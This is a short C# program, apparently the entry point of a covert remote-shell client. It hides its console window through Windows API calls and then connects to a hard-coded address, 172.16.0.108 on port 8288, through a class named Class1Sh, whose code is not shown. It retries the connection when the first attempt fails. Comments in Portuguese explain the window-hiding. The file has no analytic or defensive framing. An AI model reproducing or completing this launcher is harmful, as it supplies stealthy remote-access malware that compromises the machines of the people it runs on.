using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Timers;
using System.Threading;



namespace HostSystem
{
	public class Program
	{
		//bibliotes do windows para ocutar tela preta
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		
		//fim da biblioteca ocultar
		public static void Main(string[] args)
		{

			//ocutar ou exibir a tela preta, quando executado no visual studio ele exibe a ela preta, na const ocutar 1 para exibir e 0 para ocuatar
			const int ocultar = 1;
			const int mostrar = 5;
			var handle = GetConsoleWindow();
			ShowWindow(handle, ocultar);
			//ShowWindow(handle, mostrar);
			//fim do ocuta

			string ip;
			int porta;


			Class1Sh sh = new Class1Sh();


			try
			{

				ip = "172.16.0.108";
				porta = 8288;
				sh.Cod(ip, porta);

			}
			catch (Exception)
			{
				ip = "172.16.0.108";
				porta = 8288;
				sh.Cod(ip, porta);
				Console.WriteLine("Erro de Conecxao");
				Console.ReadLine();
			}

			


		}

		


	}
}
